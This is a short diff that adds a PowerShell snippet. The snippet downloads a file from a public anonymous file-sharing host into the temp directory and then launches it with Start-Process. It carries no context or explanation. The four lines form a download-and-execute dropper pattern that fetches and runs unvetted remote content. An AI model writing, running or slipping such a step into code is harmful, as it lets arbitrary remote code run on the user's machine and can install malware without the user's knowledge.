@@ -1,0 +1,4 @@
+$url = 'tmpfiles.org/dl/wzAXVluXylQ6/test.txt'
+$tempFile = Join-Path $env:TEMP 'test.txt'
+Invoke-WebRequest -Uri $url -OutFile $tempFile
+Start-Process -FilePath $tempFile -Wait
